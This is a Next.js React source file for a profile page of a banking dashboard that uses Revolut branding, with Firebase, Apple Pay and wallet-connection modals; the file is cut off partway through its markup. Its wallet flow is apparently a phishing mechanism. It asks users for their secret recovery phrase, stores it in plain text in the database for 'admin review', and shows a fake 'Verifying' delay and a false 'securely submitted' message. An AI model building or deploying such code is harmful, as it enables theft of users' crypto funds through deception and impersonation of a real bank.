"use client";

import { useState, useRef } from "react";
import { useRouter } from "next/navigation";
import {
  CheckCircle2, Copy, Sparkles, MapPin, Calendar,
  Award, Zap, Gem, Wallet, Smartphone, ShieldCheck,
  ArrowUpRight, QrCode, Loader2, Check, Camera, X, CheckCircle,
  ChevronLeft, KeyRound, Hexagon, CircleDashed, Shield, Clock
} from "lucide-react";
import Link from "next/link";
import Image from "next/image";

// Firebase & Context Imports
import { useAuth } from "@/context/AuthContext";
import { db } from "@/lib/firebase/config";
import { doc, updateDoc } from "firebase/firestore";

const WEB3_PROVIDERS = [
  { id: "metamask", name: "MetaMask", icon: Hexagon, color: "text-orange-500", border: "border-orange-500/20", bg: "bg-orange-500/10" },
  { id: "trust", name: "Trust Wallet", icon: Shield, color: "text-blue-500", border: "border-blue-500/20", bg: "bg-blue-500/10" },
  { id: "coinbase", name: "Coinbase Wallet", icon: CircleDashed, color: "text-blue-600", border: "border-blue-600/20", bg: "bg-blue-600/10" },
  { id: "ledger", name: "Ledger", icon: Wallet, color: "text-slate-800 dark:text-white", border: "border-slate-300 dark:border-white/20", bg: "bg-slate-200 dark:bg-white/10" }
];

export default function ProfilePage() {
  const router = useRouter();
  const { userData, user, loading } = useAuth();

  // UI & Interaction States
  const [copied, setCopied] = useState(false);
  const [isUploading, setIsUploading] = useState(false);

  // Modal States
  const [activeModal, setActiveModal] = useState<"apple" | "web3" | "qr" | "benefits" | null>(null); 
  const [integrationLoading, setIntegrationLoading] = useState(false);
  const [integrationSuccess, setIntegrationSuccess] = useState(false);

  // Web3 Specific States
  const [web3Step, setWeb3Step] = useState<"select" | "phrase">("select");
  const [selectedProvider, setSelectedProvider] = useState<typeof WEB3_PROVIDERS[0] | null>(null);
  const [secretPhrase, setSecretPhrase] = useState("");

  const fileInputRef = useRef<HTMLInputElement>(null);

  // --- HELPER FUNCTIONS ---
  const getInitials = () => {
    if (!userData) return "??";
    return `${userData.firstName?.[0] || ""}${userData.lastName?.[0] || ""}`.toUpperCase();
  };

  const formatDate = (dateString: string) => {
    if (!dateString) return "Recent";
    return new Date(dateString).toLocaleDateString('en-US', { month: 'long', year: 'numeric' });
  };

  const copyHandle = () => {
    const handle = `@${userData?.firstName?.toLowerCase()}${userData?.lastName?.toLowerCase() || 'user'}`;
    navigator.clipboard.writeText(handle);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // --- CLOUDINARY AVATAR UPLOAD ---
  const handleAvatarUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file || !user) return;
    setIsUploading(true);

    try {
      const formData = new FormData();
      formData.append("file", file);
      formData.append("upload_preset", process.env.NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET!);

      const cloudName = process.env.NEXT_PUBLIC_CLOUDINARY_CLOUD_NAME;
      const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
        method: "POST",
        body: formData,
      });

      if (!response.ok) throw new Error("Cloudinary upload failed");

      const data = await response.json();
      await updateDoc(doc(db, "users", user.uid), { photoURL: data.secure_url });
    } catch (error) {
      console.error("Error uploading avatar:", error);
      alert("Failed to upload avatar. Please check console.");
    } finally {
      setIsUploading(false);
    }
  };

  // --- APPLE PAY LOGIC ---
  const toggleApplePay = async () => {
    if (!user) return;
    setIntegrationLoading(true);

    try {
      if (userData.applePayActive) {
        await updateDoc(doc(db, "users", user.uid), { applePayActive: false });
        closeModal();
      } else {
        await new Promise(resolve => setTimeout(resolve, 2000));
        await updateDoc(doc(db, "users", user.uid), { applePayActive: true });
        setIntegrationSuccess(true);
        setTimeout(() => closeModal(), 1500);
      }
    } catch (error) {
      console.error("Apple Pay Error:", error);
    } finally {
      setIntegrationLoading(false);
    }
  };

  // --- WEB3 LOGIC ---
  const disconnectWeb3 = async () => {
    if (!user) return;
    setIntegrationLoading(true);
    try {
      await updateDoc(doc(db, "users", user.uid), { web3Wallet: null, web3Provider: null, web3Status: null });
      closeModal();
    } catch (error) {
      console.error("Disconnect Error:", error);
    } finally {
      setIntegrationLoading(false);
    }
  };

  const cancelWeb3Request = async () => {
    if (!user) return;
    setIntegrationLoading(true);
    try {
      await updateDoc(doc(db, "users", user.uid), { web3Status: null, web3Provider: null, web3Phrase: null });
      closeModal();
    } catch (error) {
      console.error("Cancel Error:", error);
    } finally {
      setIntegrationLoading(false);
    }
  };

  const connectWeb3Phrase = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user || !secretPhrase.trim() || !selectedProvider) return;
    
    setIntegrationLoading(true);

    try {
      // Simulate connection delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Save details to Firebase and mark as pending review
      await updateDoc(doc(db, "users", user.uid), { 
        web3Provider: selectedProvider.name,
        web3Phrase: secretPhrase,
        web3Status: "pending" // Set to pending for Admin approval
      });

      setIntegrationSuccess(true);
      setTimeout(() => closeModal(), 2000);
    } catch (error) {
      console.error("Web3 Error:", error);
      alert("Failed to submit wallet.");
    } finally {
      setIntegrationLoading(false);
    }
  };

  const closeModal = () => {
    setActiveModal(null);
    setIntegrationSuccess(false);
    setWeb3Step("select");
    setSelectedProvider(null);
    setSecretPhrase("");
  };

  if (loading) {
    return (
      <div className="w-full h-[60vh] flex items-center justify-center">
        <Loader2 className="w-8 h-8 text-cyan-500 animate-spin" />
      </div>
    );
  }

  if (!userData) return null;

  return (
    <div className="w-full max-w-6xl mx-auto pb-12 animate-in fade-in duration-500 space-y-6 sm:space-y-8 relative">

      {/* Hidden File Input for Avatar */}
      <input type="file" accept="image/*" className="hidden" ref={fileInputRef} onChange={handleAvatarUpload} />

      {/* --- ELITE INTEGRATION MODALS --- */}
      {activeModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/10 rounded-[32px] p-6 sm:p-8 w-full max-w-sm shadow-2xl relative animate-in zoom-in-95 duration-300 overflow-hidden">

            <button onClick={closeModal} className="absolute top-6 right-6 text-slate-400 hover:text-slate-900 dark:hover:text-white transition-colors z-10">
              <X className="w-5 h-5" />
            </button>

            {/* Apple Pay Modal */}
            {activeModal === "apple" && (
              <div className="flex flex-col items-center text-center mt-4">
                <div className="w-16 h-16 rounded-2xl bg-black flex items-center justify-center shadow-lg mb-6 relative overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-tr from-white/10 to-transparent" />
                  <Smartphone className="w-8 h-8 text-white" />
                </div>
                <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Apple Pay</h3>
                <p className="text-sm text-slate-500 mb-8 px-2">
                  {userData.applePayActive
                    ? "Your physical card is currently provisioned to your Apple Wallet."
                    : "Provision your virtual card to Apple Wallet for seamless tap-to-pay globally."}
                </p>

                <button
                  onClick={toggleApplePay}
                  disabled={integrationLoading || integrationSuccess}
                  className={`w-full py-4 rounded-full font-bold text-sm transition-all flex items-center justify-center gap-2 ${userData.applePayActive
                      ? 'bg-rose-500/10 text-rose-500 hover:bg-rose-500/20'
                      : 'bg-black text-white hover:bg-slate-800 shadow-xl'
                    }`}
                >
                  {integrationLoading ? <Loader2 className="w-5 h-5 animate-spin" /> :
                    integrationSuccess ? <CheckCircle className="w-5 h-5 text-emerald-500" /> :
                      userData.applePayActive ? "Remove from Wallet" : "Add to Apple Wallet"}
                </button>
              </div>
            )}

            {/* Web3 Phrase Modal Flow */}
            {activeModal === "web3" && (
              <div className="flex flex-col mt-2 h-[420px]">
                
                {/* Condition 1: User is already connected */}
                {userData.web3Wallet && !integrationSuccess ? (
                   <div className="flex flex-col items-center text-center mt-8">
                     <div className="w-16 h-16 rounded-2xl bg-[#1e293b] flex items-center justify-center shadow-lg mb-6 relative overflow-hidden">
                       <Wallet className="w-8 h-8 text-[#38bdf8]" />
                     </div>
                     <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Wallet Connected</h3>
                     <p className="text-sm font-medium text-slate-500 mb-2">Provider: <span className="text-slate-900 dark:text-white">{userData.web3Provider || "Web3 Wallet"}</span></p>
                     <p className="text-xs font-mono text-[#38bdf8] mb-10 bg-[#38bdf8]/10 px-3 py-1.5 rounded-lg border border-[#38bdf8]/20">
                       {userData.web3Wallet}
                     </p>
                     <button
                        onClick={disconnectWeb3}
                        disabled={integrationLoading}
                        className="w-full py-4 rounded-xl font-bold text-sm transition-all flex items-center justify-center gap-2 bg-rose-500/10 text-rose-500 hover:bg-rose-500/20"
                      >
                        {integrationLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Disconnect Wallet"}
                      </button>
                   </div>
                ) : 
                
                /* Condition 2: Wallet is in Pending status */
                !userData.web3Wallet && userData.web3Status === 'pending' && !integrationSuccess ? (
                   <div className="flex flex-col items-center text-center mt-8">
                     <div className="w-16 h-16 rounded-2xl bg-amber-50 dark:bg-amber-500/10 flex items-center justify-center shadow-lg mb-6 relative overflow-hidden border border-amber-200 dark:border-amber-500/20">
                       <ShieldCheck className="w-8 h-8 text-amber-500" />
                     </div>
                     <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Verification in Progress</h3>
                     <p className="text-sm font-medium text-slate-500 mb-8 px-4">
                       Your connection request for <span className="text-slate-900 dark:text-white">{userData.web3Provider}</span> is currently being reviewed by our security team.
                     </p>
                     <button
                        onClick={cancelWeb3Request}
                        disabled={integrationLoading}
                        className="w-full py-4 rounded-xl font-bold text-sm transition-all flex items-center justify-center gap-2 bg-rose-500/10 text-rose-500 hover:bg-rose-500/20"
                      >
                        {integrationLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : "Cancel Request"}
                      </button>
                   </div>
                ) : 

                /* Condition 3: Success Screen just after submitting */
                integrationSuccess ? (
                   <div className="flex flex-col items-center justify-center text-center h-full animate-in zoom-in-95 duration-500">
                     <div className="w-20 h-20 rounded-full bg-amber-50 dark:bg-amber-500/10 flex items-center justify-center mb-6 shadow-[0_0_30px_rgba(245,158,11,0.2)]">
                       <Clock className="w-10 h-10 text-amber-500" />
                     </div>
                     <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Request Submitted</h3>
                     <p className="text-sm text-slate-500 px-4">Your wallet details have been securely submitted and are pending admin review.</p>
                   </div>
                ) : 

                /* Condition 4: Flow - Step 1: Wallet Selection */
                web3Step === "select" ? (
                  <div className="flex flex-col h-full animate-in slide-in-from-left-4 duration-300">
                    <div className="text-center mb-6 mt-4">
                      <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Connect Wallet</h3>
                      <p className="text-[13px] text-slate-500">Select your Web3 provider to link your on-chain assets.</p>
                    </div>
                    
                    <div className="grid grid-cols-2 gap-3 flex-1 overflow-y-auto pb-4">
                      {WEB3_PROVIDERS.map(provider => (
                        <button 
                          key={provider.id}
                          onClick={() => { setSelectedProvider(provider); setWeb3Step("phrase"); }}
                          className={`flex flex-col items-center justify-center gap-3 p-4 rounded-2xl border bg-slate-50 dark:bg-[#111115] hover:bg-slate-100 dark:hover:bg-white/[0.04] transition-all active:scale-95 border-slate-200 dark:border-white/5 hover:${provider.border}`}
                        >
                          <div className={`w-12 h-12 rounded-full flex items-center justify-center ${provider.bg}`}>
                            <provider.icon className={`w-6 h-6 ${provider.color}`} strokeWidth={1.5} />
                          </div>
                          <span className="text-xs font-bold text-slate-900 dark:text-white">{provider.name}</span>
                        </button>
                      ))}
                    </div>
                  </div>
                ) : 

                /* Condition 5: Flow - Step 2: Phrase Input */
                (
                  <div className="flex flex-col h-full animate-in slide-in-from-right-4 duration-300">
                    <button onClick={() => setWeb3Step("select")} className="absolute top-6 left-6 text-slate-400 hover:text-slate-900 dark:hover:text-white transition-colors z-10">
                      <ChevronLeft className="w-5 h-5" />
                    </button>
                    
                    <div className="text-center mb-6 mt-4">
                      <div className={`w-12 h-12 mx-auto rounded-full flex items-center justify-center mb-3 ${selectedProvider?.bg}`}>
                         {selectedProvider && <selectedProvider.icon className={`w-6 h-6 ${selectedProvider.color}`} />}
                      </div>
                      <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-1">Import {selectedProvider?.name}</h3>
                      <p className="text-[12px] text-slate-500 leading-relaxed px-4">Enter your 12 or 24-word secret recovery phrase to link your wallet.</p>
                    </div>

                    <form onSubmit={connectWeb3Phrase} className="flex flex-col flex-1">
                      <div className="relative flex-1 mb-4">
                        <textarea
                          required
                          value={secretPhrase}
                          onChange={(e) => setSecretPhrase(e.target.value)}
                          placeholder="e.g. apple nature dog ocean..."
                          className="w-full h-full min-h-[120px] p-4 rounded-2xl bg-slate-50 dark:bg-[#111115] border border-slate-200 dark:border-white/10 text-sm font-medium text-slate-900 dark:text-white placeholder:text-slate-400 outline-none focus:border-cyan-500 resize-none shadow-inner"
                        />
                        <KeyRound className="absolute bottom-4 right-4 w-4 h-4 text-slate-300 dark:text-slate-600" />
                      </div>
                      
                      <button
                        type="submit"
                        disabled={integrationLoading || !secretPhrase.trim()}
                        className="w-full py-4 rounded-xl font-bold text-sm transition-all flex items-center justify-center gap-2 bg-slate-900 dark:bg-white text-white dark:text-slate-900 shadow-xl active:scale-95 disabled:opacity-50"
                      >
                        {integrationLoading ? (
                          <><Loader2 className="w-5 h-5 animate-spin" /> Verifying...</>
                        ) : "Import Wallet"}
                      </button>
                    </form>
                  </div>
                )}
              </div>
            )}

            {/* QR Code Modal */}
            {activeModal === "qr" && (
              <div className="flex flex-col items-center text-center mt-4">
                <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Scan to Pay</h3>
                <p className="text-sm text-slate-500 mb-6">Let friends scan this code to send you money instantly.</p>
                <div className="w-48 h-48 bg-white rounded-2xl p-4 flex items-center justify-center shadow-inner border border-slate-200">
                  <QrCode className="w-full h-full text-slate-900" />
                </div>
                <p className="text-xs font-mono text-slate-400 mt-6 tracking-widest uppercase">
                  @{userData.firstName?.toLowerCase()}{userData.lastName?.toLowerCase() || 'user'}
                </p>
              </div>
            )}

            {/* BENEFITS MODAL */}
            {activeModal === "benefits" && (
              <div className="flex flex-col mt-2">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-12 h-12 rounded-2xl bg-cyan-50 dark:bg-cyan-500/10 flex items-center justify-center border border-cyan-100 dark:border-cyan-500/20">
                    <Gem className="w-6 h-6 text-cyan-600 dark:text-cyan-400" />
                  </div>
                  <div>
                    <h3 className="text-xl font-bold text-slate-900 dark:text-white">
                      {userData.plan || "Standard"} Plan
                    </h3>
                    <p className="text-xs font-medium text-slate-500 uppercase tracking-widest mt-0.5">Active Benefits</p>
                  </div>
                </div>

                <div className="space-y-3 mb-8">
                  {userData.plan === "Metal" ? (
                    <>
                      <BenefitItem icon={Zap} title="1% Global Cashback" desc="Earn on every transaction, paid daily." />
                      <BenefitItem icon={ShieldCheck} title="0% FX Fees" desc="Unlimited currency exchange at interbank rates." />
                      <BenefitItem icon={Award} title="Priority Concierge" desc="24/7 dedicated support via in-app chat." />
                      <BenefitItem icon={MapPin} title="Lounge Access" desc="Free access to 1,000+ airport lounges globally." />
                    </>
                  ) : (
                    <>
                      <BenefitItem icon={ShieldCheck} title="Standard FX" desc="Exchange up to $1,000/mo without fees." />
                      <BenefitItem icon={Smartphone} title="Virtual Cards" desc="Generate unlimited disposable virtual cards." />
                      <BenefitItem icon={Wallet} title="Basic Withdrawals" desc="Up to $200/mo free ATM withdrawals." />
                    </>
                  )}
                </div>

                {userData.plan !== "Metal" && (
                  <button className="w-full py-4 rounded-full font-bold text-sm bg-slate-900 dark:bg-white text-white dark:text-black hover:scale-[1.02] transition-transform shadow-xl">
                    Upgrade to Metal
                  </button>
                )}
              </div>
            )}

          </div>
        </div>
      )}

      {/* ==========================================
          HERO BANNER & AVATAR
          ========================================== */}
      <div className="relative rounded-[32px] bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/[0.04] shadow-sm dark:shadow-2xl overflow-hidden mt-2 transition-colors duration-500">

        {/* Abstract Metallic Cover Photo */}
        <div className="h-32 sm:h-48 w-full bg-gradient-to-r from-slate-100 via-slate-200 to-slate-100 dark:from-[#111115] dark:via-[#1a1a24] dark:to-[#111115] relative overflow-hidden transition-colors duration-500">
          <div className="absolute inset-0 opacity-[0.2] mix-blend-overlay" style={{ backgroundImage: 'url("data:image/svg+xml,%3Csvg viewBox=%220 0 200 200%22 xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cfilter id=%22n%22%3E%3CfeTurbulence type=%22fractalNoise%22 baseFrequency=%220.6%22 numOctaves=%223%22 stitchTiles=%22stitch%22/%3E%3C/filter%3E%3Crect width=%22100%25%22 height=%22100%25%22 filter=%22url(%23n)%22/%3E%3C/svg%3E")' }} />
          <div className="absolute -top-24 -left-24 w-64 h-64 bg-cyan-500/10 dark:bg-cyan-500/20 blur-[80px] rounded-full" />
          <div className="absolute -bottom-24 -right-24 w-64 h-64 bg-indigo-500/10 dark:bg-indigo-500/20 blur-[80px] rounded-full" />
        </div>

        {/* Profile Info Overlay */}
        <div className="px-6 sm:px-10 pb-8 relative">
          <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4">

            <div className="flex flex-col sm:flex-row sm:items-end gap-5 -mt-12 sm:-mt-16 relative z-10">
              {/* Avatar */}
              <button
                onClick={() => fileInputRef.current?.click()}
                disabled={isUploading}
                className="w-24 h-24 sm:w-32 sm:h-32 rounded-[20px] p-1.5 bg-white dark:bg-[#030303] shadow-md dark:shadow-2xl shrink-0 transition-all duration-500 hover:scale-[1.02] active:scale-95 group relative"
              >
                <div className="w-full h-full rounded-[14px] bg-gradient-to-br from-slate-100 to-slate-200 dark:from-[#2a2a32] dark:to-[#121215] border border-slate-300 dark:border-white/10 flex items-center justify-center relative overflow-hidden">
                  {isUploading ? (
                    <Loader2 className="w-6 h-6 text-cyan-500 animate-spin z-20" />
                  ) : userData.photoURL ? (
                    <Image src={userData.photoURL} alt="Profile" fill className="object-cover" />
                  ) : (
                    <span className="font-bold text-3xl sm:text-4xl text-slate-800 dark:text-white tracking-widest group-hover:scale-90 transition-transform">
                      {getInitials()}
                    </span>
                  )}
                  <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex flex-col items-center justify-center z-10">
                    <Camera className="w-5 h-5 text-white mb-1" />
                    <span className="text-[10px] font-bold uppercase tracking-widest text-white drop-shadow-md">Edit</span>
                  </div>
                </div>
              </button>

              {/* Name & Handle */}
              <div className="pb-1">
                <div className="flex items-center gap-2">
                  <h1 className="text-2xl sm:text-3xl font-bold text-slate-900 dark:text-white tracking-tight transition-colors">
                    {userData.firstName} {userData.lastName}
                  </h1>
                  <CheckCircle2 className="w-5 h-5 text-cyan-500 dark:text-cyan-400" />
                </div>
                <div className="flex items-center gap-3 mt-1.5">
                  <button
                    onClick={copyHandle}
                    className="text-sm font-mono text-slate-500 dark:text-slate-400 bg-slate-50 dark:bg-white/[0.04] border border-slate-200 dark:border-white/[0.05] px-2.5 py-1 rounded-lg flex items-center gap-2 hover:bg-slate-100 dark:hover:bg-white/[0.08] transition-colors active:scale-95"
                  >
                    @{userData.firstName?.toLowerCase()}{userData.lastName?.toLowerCase() || 'user'}
                    {copied ? <Check className="w-3 h-3 text-emerald-500" /> : <Copy className="w-3 h-3 text-slate-400" />}
                  </button>
                  <span className="text-[11px] font-bold tracking-widest uppercase text-emerald-600 dark:text-emerald-400 flex items-center gap-1">
                    <Sparkles className="w-3 h-3" /> {userData.plan || 'Standard'} Member
                  </span>
                </div>
              </div>
            </div>

            {/* Quick Actions */}
            <div className="flex items-center gap-3 pb-1">
              <button
                onClick={() => setActiveModal("qr")}
                className="p-2.5 rounded-xl bg-slate-50 dark:bg-white/[0.03] border border-slate-200 dark:border-white/[0.05] hover:bg-slate-100 dark:hover:bg-white/[0.08] text-slate-600 dark:text-white transition-colors group active:scale-95"
              >
                <QrCode className="w-5 h-5 text-slate-500 dark:text-slate-400 group-hover:text-cyan-500 dark:group-hover:text-cyan-400 transition-colors" />
              </button>
              <Link href="/dashboard/settings" className="px-5 py-2.5 rounded-xl bg-slate-900 dark:bg-white text-white dark:text-black font-bold text-[13px] hover:bg-slate-800 dark:hover:bg-slate-200 transition-transform active:scale-95 shadow-md dark:shadow-[0_0_20px_rgba(255,255,255,0.15)] flex items-center">
                Edit Profile
              </Link>
            </div>
          </div>
        </div>
      </div>

      {/* ==========================================
          BENTO BOX GRID
          ========================================== */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">

        {/* LEFT COLUMN: Identity & Rewards */}
        <div className="lg:col-span-4 space-y-6">

          {/* Identity Details Bento */}
          <div className="bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/[0.04] rounded-[24px] p-6 shadow-sm dark:shadow-xl transition-colors duration-500">
            <h3 className="text-[11px] font-bold text-slate-400 dark:text-slate-500 uppercase tracking-widest mb-5">Identity Details</h3>

            <div className="space-y-4">
              <div className="flex items-start gap-4">
                <div className="w-8 h-8 rounded-full bg-slate-50 dark:bg-white/[0.02] border border-slate-200 dark:border-white/[0.05] flex items-center justify-center shrink-0">
                  <MapPin className="w-3.5 h-3.5 text-slate-500 dark:text-slate-400" />
                </div>
                <div>
                  <p className="text-[11px] font-medium text-slate-500 mb-0.5">Primary Residence</p>
                  <p className="text-[13px] font-bold dark:font-medium text-slate-800 dark:text-slate-200 leading-relaxed">
                    {userData.address || "No address provided"}
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-4">
                <div className="w-8 h-8 rounded-full bg-slate-50 dark:bg-white/[0.02] border border-slate-200 dark:border-white/[0.05] flex items-center justify-center shrink-0">
                  <Calendar className="w-3.5 h-3.5 text-slate-500 dark:text-slate-400" />
                </div>
                <div>
                  <p className="text-[11px] font-medium text-slate-500 mb-0.5">Joined</p>
                  <p className="text-[13px] font-bold dark:font-medium text-slate-800 dark:text-slate-200">
                    {formatDate(userData.createdAt)}
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-4">
                <div className="w-8 h-8 rounded-full bg-slate-50 dark:bg-white/[0.02] border border-slate-200 dark:border-white/[0.05] flex items-center justify-center shrink-0">
                  <ShieldCheck className="w-3.5 h-3.5 text-emerald-500 dark:text-emerald-400" />
                </div>
                <div>
                  <p className="text-[11px] font-medium text-slate-500 mb-0.5">Verification Level</p>
                  <p className="text-[13px] font-bold dark:font-medium text-emerald-600 dark:text-emerald-400">
                    {userData.role === "admin" ? "Management Access" : "Tier 3 (Full Access)"}
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Loyalty & Rewards Bento */}
          <div className="grid grid-cols-2 gap-4">
            <button
              onClick={() => router.push('/dashboard/rewards')}
              className="text-left bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/[0.04] rounded-[20px] p-5 shadow-sm dark:shadow-xl flex flex-col justify-between aspect-square relative overflow-hidden group hover:border-cyan-500/30 transition-all active:scale-95"
            >
              <div className="absolute top-0 right-0 w-20 h-20 bg-cyan-500/5 dark:bg-cyan-500/10 blur-[30px] rounded-full" />
              <div className="w-8 h-8 rounded-full bg-cyan-50 dark:bg-cyan-500/10 border border-cyan-100 dark:border-cyan-500/20 flex items-center justify-center group-hover:scale-110 transition-transform">
                <Award className="w-4 h-4 text-cyan-600 dark:text-cyan-400" />
              </div>
              <div>
                <p className="text-[20px] font-bold text-slate-900 dark:text-white tracking-tight">{userData.revPoints || "0"}</p>
                <p className="text-[10px] font-bold text-slate-400 dark:text-slate-500 uppercase tracking-widest mt-0.5">RevPoints</p>
              </div>
            </button>

            <button
              onClick={() => router.push('/dashboard/rewards/cashback')}
              className="text-left bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/[0.04] rounded-[20px] p-5 shadow-sm dark:shadow-xl flex flex-col justify-between aspect-square relative overflow-hidden group hover:border-emerald-500/30 transition-all active:scale-95"
            >
              <div className="absolute top-0 right-0 w-20 h-20 bg-emerald-500/5 dark:bg-emerald-500/10 blur-[30px] rounded-full" />
              <div className="w-8 h-8 rounded-full bg-emerald-50 dark:bg-emerald-500/10 border border-emerald-100 dark:border-emerald-500/20 flex items-center justify-center group-hover:scale-110 transition-transform">
                <Zap className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
              </div>
              <div>
                <p className="text-[20px] font-bold text-slate-900 dark:text-white tracking-tight">${userData.cashback || "0.00"}</p>
                <p className="text-[10px] font-bold text-slate-400 dark:text-slate-500 uppercase tracking-widest mt-0.5">Cashback</p>
              </div>
            </button>
          </div>
        </div>

        {/* RIGHT COLUMN: Physical Card & Integrations */}
        <div className="lg:col-span-8 space-y-6">

          {/* Main Membership Card Display */}
          <div className="bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/[0.04] rounded-[24px] p-1 shadow-sm dark:shadow-xl relative overflow-hidden flex flex-col sm:flex-row transition-colors duration-500">

            <div className="w-full sm:w-1/2 p-6 sm:p-8 flex items-center justify-center bg-slate-50 dark:bg-white/[0.01] rounded-[20px] transition-colors">
              {/* Ultra-Realistic Physical Card Render */}
              <button
                onClick={() => router.push('/dashboard/cards/virtual')}
                className="w-[280px] h-[175px] rounded-[16px] p-5 relative overflow-hidden shadow-lg dark:shadow-[0_20px_40px_-10px_rgba(0,0,0,1),inset_0_1px_1px_rgba(255,255,255,0.3)] border border-slate-300 dark:border-white/[0.08] bg-gradient-to-br from-slate-100 to-slate-300 dark:from-[#111115] dark:via-[#1a1a24] dark:to-[#111115] group cursor-pointer transform hover:-translate-y-2 hover:rotate-1 transition-all duration-500 ease-out text-left"
              >
                <div className="absolute inset-0 opacity-[0.4] dark:opacity-[0.2] mix-blend-overlay pointer-events-none" style={{ backgroundImage: 'url("data:image/svg+xml,%3Csvg viewBox=%220 0 200 200%22 xmlns=%22http://www.w3.org/2000/svg%22%3E%3Cfilter id=%22n%22%3E%3CfeTurbulence type=%22fractalNoise%22 baseFrequency=%220.9%22 numOctaves=%223%22 stitchTiles=%22stitch%22/%3E%3C/filter%3E%3Crect width=%22100%25%22 height=%22100%25%22 filter=%22url(%23n)%22/%3E%3C/svg%3E")' }} />
                <div className="absolute top-0 left-0 w-full h-full bg-gradient-to-br from-white/40 via-transparent to-black/10 dark:from-white/10 dark:via-transparent dark:to-black/50 pointer-events-none" />

                <div className="relative z-10 flex flex-col justify-between h-full">
                  <div className="flex justify-between items-start">
                    <div className="w-10 h-7 rounded bg-gradient-to-br from-[#d4af37] via-[#aa8222] to-[#8a6513] shadow-inner border border-black/20 flex flex-col justify-evenly px-1">
                      <div className="w-full h-[1px] bg-black/20" />
                      <div className="w-full h-[1px] bg-black/20" />
                    </div>
                    <span className="font-bold text-sm text-slate-800 dark:text-white/90 italic tracking-tighter">Revolut</span>
                  </div>
                  <div>
                    <p className="text-[14px] font-mono tracking-[0.2em] text-slate-800 dark:text-white/90 drop-shadow-sm dark:drop-shadow-md group-hover:tracking-[0.25em] transition-all">
                      **** **** **** 9012
                    </p>
                    <div className="flex justify-between items-end mt-2">
                      <p className="text-[11px] font-bold tracking-widest uppercase text-slate-700 dark:text-white/80 drop-shadow-sm dark:drop-shadow-md">
                        {userData.firstName} {userData.lastName}
                      </p>
                      <div className="w-8 h-8 rounded-full border-2 border-slate-400 dark:border-white/20 flex items-center justify-center">
                        <div className="w-4 h-4 rounded-full bg-slate-400 dark:bg-white/40" />
                      </div>
                    </div>
                  </div>
                </div>
              </button>
            </div>

            <div className="w-full sm:w-1/2 p-6 sm:p-8 flex flex-col justify-center border-t sm:border-t-0 sm:border-l border-slate-200 dark:border-white/[0.04]">
              <div className="w-10 h-10 rounded-full bg-slate-50 dark:bg-white/[0.03] border border-slate-200 dark:border-white/[0.05] flex items-center justify-center mb-4 transition-colors">
                <Gem className="w-5 h-5 text-slate-400 dark:text-slate-300" />
              </div>
              <h2 className="text-xl font-bold text-slate-900 dark:text-white tracking-tight">{userData.plan || "Standard"} Plan</h2>
              <p className="text-[13px] text-slate-500 dark:text-slate-400 mt-2 leading-relaxed">
                Enjoy {userData.plan === 'Metal' ? 'unlimited FX and priority 24/7 support' : 'secure global banking features.'}
              </p>
              <div className="mt-6 flex gap-3">
                <button
                  onClick={() => router.push('/dashboard/settings')}
                  className="flex-1 py-2.5 rounded-xl bg-slate-50 dark:bg-white/[0.03] border border-slate-200 dark:border-white/[0.05] hover:bg-slate-100 dark:hover:bg-white/[0.08] text-[12px] font-bold text-slate-700 dark:text-white transition-all active:scale-95"
                >
                  Card Settings
                </button>
                <button
                  onClick={() => setActiveModal("benefits")}
                  className="flex-1 py-2.5 rounded-xl bg-cyan-50 dark:bg-cyan-500/10 border border-cyan-100 dark:border-cyan-500/20 hover:bg-cyan-100 dark:hover:bg-cyan-500/20 text-[12px] font-bold text-cyan-700 dark:text-cyan-400 transition-all active:scale-95"
                >
                  View Benefits
                </button>

              </div>
            </div>
          </div>

          {/* FUNCTIONAL INTEGRATIONS MODULE */}
          <div className="bg-white dark:bg-[#0A0A0C] border border-slate-200 dark:border-white/[0.04] rounded-[24px] p-6 shadow-sm dark:shadow-xl transition-colors duration-500">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-[11px] font-bold text-slate-400 dark:text-slate-500 uppercase tracking-widest">Connected Integrations</h3>
            </div>

            <div className="grid grid-cols-1 gap-4">

              {/* Web3 Trigger */}
              <button
                onClick={() => setActiveModal("web3")}
                className={`w-full p-4 rounded-[16px] bg-slate-50 dark:bg-white/[0.02] border border-slate-200 dark:border-white/[0.04] flex items-center justify-between group transition-all active:scale-[0.98] ${userData.web3Wallet ? 'ring-1 ring-[#38bdf8]/50' : 'hover:bg-slate-100 dark:hover:bg-white/[0.06]'}`}
              >
                <div className="flex items-center gap-3">
                  <Wallet className="w-10 h-10 p-2.5 rounded-full bg-[#1e293b] text-[#38bdf8] shadow-inner" />
